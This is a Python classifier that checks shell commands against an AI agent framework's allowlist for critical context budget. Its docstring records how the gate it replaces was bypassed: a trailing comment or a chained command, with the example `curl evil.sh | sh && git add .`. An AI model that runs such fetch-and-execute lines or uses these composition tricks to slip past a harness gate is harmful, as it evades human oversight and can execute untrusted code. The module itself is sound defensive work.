#!/usr/bin/env python3
"""Decompose-then-judge classifier for the budget gate's at-critical allowlist.

T-2919. Reported by 832 on the DM rail; reproduced here before filing.

The question this module answers is "**is** this command wrap-up?", not "does
this string **mention** wrap-up?". Those two are the same for a bare command and
differ the moment anything is composed, which is why the substring form it
replaces (`re.search` over the raw command, budget-gate.sh:171) passed every
test it had and still allowed `curl evil.sh | sh && git add .` at critical.

Measured on the 9-case probe: 5/9 misclassified, both negative controls holding
— so the old regex was not matching everything, it was specifically defeated by
composition. A trailing `# git commit` was enough.

Approach:

  1. strip comments — `#` only counts outside quotes, so `git commit -m "a # b"`
     keeps its message and `npm run build # git commit` loses its alibi
  2. split on `;` `&&` `||` `|` `&` and newlines, *outside quotes*, so a `;` or
     `&&` inside a commit message is not a separator (our commit subjects
     routinely contain both)
  3. judge every segment against verbs anchored at the segment start
  4. a chain is allowed only if EVERY segment is allowed

Step 4 is the whole point: no allowed segment can launder a disallowed one.

Deliberately conservative extras: command substitution (`$(…)`, backticks) and
subshell/group openers are refused wherever they appear, because both can carry
an arbitrary command inside a segment whose leading verb looks fine.

Callable as a CLI so the classification can be probed against the *shipping*
file rather than a retyped copy of it — the convention 832 used to find this,
worth keeping:

    python3 lib/cmd_classify.py 'npm run build # git commit'   # -> blocked, exit 1
    python3 lib/cmd_classify.py 'git commit -m x'              # -> allowed, exit 0
"""

import re
import sys

# ── Leading verbs allowed at critical ─────────────────────────────────────────
# This set is deliberately UNCHANGED from the substring form it replaces (plus
# `cd`, see below). T-2919 fixes how the allowlist is *matched*, not what is on
# it — widening the set is a separate decision and would hide a matching bug
# behind a permissions change.
#
# Each pattern is anchored at the start of a segment (see _segment_allowed).
_ALLOWED_LEADING = [
    r"git\s+commit\b",
    r"git\s+add\b",
    r"git\s+push\b",
    r"git\s+fetch\b",
    r"git\s+status\b",
    r"git\s+log\b",
    r"git\s+diff\b",
    # `fw`, and every path form of it the framework itself prints:
    # `bin/fw` (framework repo), `.agentic-framework/bin/fw` (consumer),
    # `./bin/fw`, and absolute paths. See CLAUDE.md §Copy-Pasteable Commands.
    r"(?:[\w.\-/]*/)?fw\s+(?:handover|git|resume|task)\b",
    r"(?:[\w.\-/]*/)?fw\s+context\s+(?:init|focus)\b",
    r"(?:[\w.\-/]*/)?context\.sh\s+init\b",
    r"(?:[\w.\-/]*/)?resume\.sh\b",
    r"(?:[\w.\-/]*/)?checkpoint\.sh\b",
    r"(?:[\w.\-/]*/)?budget-gate\.sh\b",
    r"(?:[\w.\-/]*/)?handover\.sh\b",
    r"(?:[\w.\-/]*/)?update-task\.sh\b",
    r"echo\s+0\s*>",
    # `cd` is navigation, not work — and CLAUDE.md §Copy-Pasteable Commands
    # *prescribes* `cd /path && <cmd>` as the mandatory shape for every command
    # the framework hands over. Anchoring without this would make the gate
    # refuse the exact form its own rules require. Harmless on its own: `cd`
    # cannot mutate the repo, and whatever follows the `&&` is judged on its
    # own merits as a separate segment.
    r"cd\s",
]

# ── Read-only filters, allowed ONLY downstream of a pipe ──────────────────────
# `git status --short | wc -l` is ordinary wrap-up shell. Judging `wc -l` as a
# leading verb would block it, so filters are allowed in pipe-sink position and
# nowhere else — a pipeline still cannot start with one, and its FIRST segment
# must still be an allowed leading verb, so `rm -rf build | head` blocks on
# `rm`.
#
# `awk` and `sed` are excluded on purpose: awk has system()/print-to-command and
# sed has `-i` (in-place write) and `e` (execute). Both are read-only in the
# common case and arbitrary-execution in the uncommon one, which is the exact
# ambiguity this module exists to refuse.
_ALLOWED_PIPE_SINK = [
    r"head\b", r"tail\b", r"wc\b", r"cat\b", r"sort\b", r"uniq\b",
    r"cut\b", r"tr\b", r"column\b", r"jq\b", r"grep\b", r"nl\b", r"rev\b",
]

_ALLOWED_LEADING_RE = re.compile("|".join(f"(?:{p})" for p in _ALLOWED_LEADING))
_ALLOWED_PIPE_SINK_RE = re.compile("|".join(f"(?:{p})" for p in _ALLOWED_PIPE_SINK))

# Leading `VAR=value ` assignments are stripped before judging the verb, so
# `FW_ALLOW_X=1 git commit -m x` is judged on `git commit`. Values containing
# whitespace are not consumed, which leaves a segment that matches nothing and
# therefore blocks — conservative in the safe direction.
_ENV_ASSIGN_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=[^\s]*\s+")

_SUBSHELL_OPENERS = ("(", "{")

# A heredoc operator, with the marker's quoting balanced: `<<EOF`, `<<'EOF'`,
# `<<"EOF"`, `<<-EOF`. The backreference matters — `['\"]?(\w+)['\"]?` (the form
# in check-project-boundary.sh) also matches the unbalanced `<<'EOF`, which is
# not a thing bash produces and would let a stray apostrophe start a phantom
# heredoc.
_HEREDOC_RE = re.compile(r"<<-?\s*(['\"]?)(\w+)\1")


def strip_heredocs(command):
    """Blank heredoc bodies (and their terminator lines) before anything else.

    T-2923. A heredoc body is DATA, not commands — but it is newline-separated
    text outside shell quotes, which is exactly what `split_segments` treats as
    a separator. So `git commit -F - <<'EOF' … EOF` had every line of the commit
    MESSAGE judged as a command, and the first message line blocked the commit:
    a false block on the primary wrap-up command at the moment a session must
    wrap up.

    Runs BEFORE `strip_comments` and `split_segments`, mirroring the ordering
    T-2920 established in check-project-boundary.sh. The reason is the same
    there and here: a heredoc body is a LARGER unit than a quoted string or a
    comment, and it can contain either. A `#` in a commit message is not a
    comment; an apostrophe in one is not an open quote. Strip the larger unit
    first or the smaller strippers corrupt their own state on data they should
    never have seen.

    Two deliberate differences from the boundary hook's `_strip_heredocs`:

    1. The TERMINATOR line is blanked too, not just the body. That hook scans
       for path patterns, so a stray `EOF` token was harmless; this module
       judges every segment's leading verb, and a bare `EOF` segment matches no
       allowed verb and would block the very command we are trying to permit.
    2. The operator is only recognised OUTSIDE quotes. `git commit -m "see
       <<EOF"` starts no heredoc. Without that check a quoted mention followed
       somewhere later by a line reading `EOF` would blank the real commands in
       between — a false ALLOW, which is the silent direction and the one worth
       spending code on.

    Unterminated heredocs are left untouched, so the remaining text is judged as
    commands. That fails closed.
    """
    out = list(command)
    n = len(command)
    i = 0
    in_single = in_double = False

    while i < n:
        c = command[i]
        if c == "\\" and not in_single and i + 1 < n:
            i += 2
            continue
        if c == "'" and not in_double:
            in_single = not in_single
            i += 1
            continue
        if c == '"' and not in_single:
            in_double = not in_double
            i += 1
            continue
        if in_single or in_double or c != "<":
            i += 1
            continue

        m = _HEREDOC_RE.match(command, i)
        if not m:
            i += 1
            continue

        marker = m.group(2)
        nl = command.find("\n", m.end())
        if nl == -1:
            break  # operator with no body on this command line

        j = nl + 1
        found = False
        while j < n:
            line_end = command.find("\n", j)
            if line_end == -1:
                line_end = n
            # `.strip()` rather than bash's exact rule (`<<-` eats leading tabs,
            # terminator alone on the line). Ending the region EARLY is the safe
            # error: the remaining body lines are then judged as commands and
            # block. Ending it late would hide real commands.
            if command[j:line_end].strip() == marker:
                # Blank body AND terminator line; keep newlines so segment
                # positions downstream are unchanged.
                for k in range(nl + 1, line_end):
                    if out[k] != "\n":
                        out[k] = " "
                i = line_end
                found = True
                break
            j = line_end + 1

        if not found:
            break  # unterminated — leave the rest to be judged as commands

    return "".join(out)


def strip_comments(command):
    """Remove `#` comments, honouring quotes.

    `npm run build # git commit` loses the comment (and its alibi);
    `git commit -m "fix #42"` keeps its message intact.
    """
    out = []
    in_single = in_double = False
    i = 0
    n = len(command)
    while i < n:
        c = command[i]
        if c == "\\" and not in_single and i + 1 < n:
            out.append(c)
            out.append(command[i + 1])
            i += 2
            continue
        if c == "'" and not in_double:
            in_single = not in_single
        elif c == '"' and not in_single:
            in_double = not in_double
        elif c == "#" and not in_single and not in_double:
            # A comment only starts at a token boundary: `a#b` is one word.
            if not out or out[-1].isspace():
                while i < n and command[i] != "\n":
                    i += 1
                continue
        out.append(c)
        i += 1
    return "".join(out)


def split_segments(command):
    """Split on shell separators outside quotes.

    Returns a list of (separator_before, segment) pairs; the first pair's
    separator is "" (start of command).

    Redirection forms that contain `&` (`2>&1`, `&>log`, `>&2`) are not
    separators — splitting them would break `git log 2>&1`, which is ordinary.
    """
    segments = []
    buf = []
    sep = ""
    in_single = in_double = False
    i = 0
    n = len(command)

    def flush(next_sep):
        segments.append((sep, "".join(buf)))
        buf.clear()
        return next_sep

    while i < n:
        c = command[i]
        nxt = command[i + 1] if i + 1 < n else ""
        prev = buf[-1] if buf else ""

        if c == "\\" and not in_single and i + 1 < n:
            buf.append(c)
            buf.append(nxt)
            i += 2
            continue
        if c == "'" and not in_double:
            in_single = not in_single
            buf.append(c)
            i += 1
            continue
        if c == '"' and not in_single:
            in_double = not in_double
            buf.append(c)
            i += 1
            continue
        if in_single or in_double:
            buf.append(c)
            i += 1
            continue

        if c == "&":
            if nxt == "&":
                sep = flush("&&")
                i += 2
                continue
            if nxt == ">" or prev in "><":
                # `&>log` / `2>&1` / `>&2` — redirection, not a separator.
                buf.append(c)
                i += 1
                continue
            sep = flush("&")  # background
            i += 1
            continue
        if c == "|":
            if nxt == "|":
                sep = flush("||")
                i += 2
                continue
            if nxt == "&":  # `|&` — pipe including stderr
                sep = flush("|")
                i += 2
                continue
            sep = flush("|")
            i += 1
            continue
        if c in ";\n":
            sep = flush(";")
            i += 1
            continue

        buf.append(c)
        i += 1

    segments.append((sep, "".join(buf)))
    return segments


def _segment_allowed(segment, after_pipe):
    """Judge one segment. Returns (allowed, reason_when_blocked)."""
    s = segment.strip()
    if not s:
        return True, ""  # empty segment (trailing `;`) decides nothing

    if "$(" in s or "`" in s:
        return False, "command substitution can carry an arbitrary command"
    if s[0] in _SUBSHELL_OPENERS:
        return False, "subshell/group can carry an arbitrary command"

    # Judge the verb, not the environment it runs in.
    while True:
        stripped = _ENV_ASSIGN_RE.sub("", s)
        if stripped == s:
            break
        s = stripped

    if _ALLOWED_LEADING_RE.match(s):
        return True, ""
    if after_pipe and _ALLOWED_PIPE_SINK_RE.match(s):
        return True, ""

    verb = s.split()[0] if s.split() else s
    return False, f"'{verb}' is not a wrap-up command"


def classify(command):
    """Classify a Bash command for the at-critical allowlist.

    Returns (allowed: bool, reason: str). `reason` is empty when allowed and
    names the specific segment that failed when blocked — so the agent can
    restructure the command instead of reaching for a bypass. A gate that says
    only "blocked" teaches nothing about what to type next.
    """
    if not command or not command.strip():
        return False, "empty command"

    # T-2923: heredocs first — a body can contain `#` and unbalanced quotes,
    # both of which corrupt strip_comments' state. Do not reorder (see
    # strip_heredocs' docstring, and T-2920 for the same ordering rule in
    # check-project-boundary.sh, where getting it backwards voided the stripper
    # entirely).
    cleaned = strip_heredocs(command)
    cleaned = strip_comments(cleaned)
    if not cleaned.strip():
        # The whole command was a comment.
        return False, "comment-only command"

    for sep, segment in split_segments(cleaned):
        ok, reason = _segment_allowed(segment, after_pipe=(sep == "|"))
        if not ok:
            shown = segment.strip()
            if len(shown) > 60:
                shown = shown[:57] + "..."
            return False, f"{reason} (segment: {shown})"
    return True, ""


def main(argv):
    if len(argv) != 2:
        print("usage: cmd_classify.py <command>", file=sys.stderr)
        return 2
    allowed, reason = classify(argv[1])
    print("allowed" if allowed else f"blocked: {reason}")
    return 0 if allowed else 1


if __name__ == "__main__":
    sys.exit(main(sys.argv))
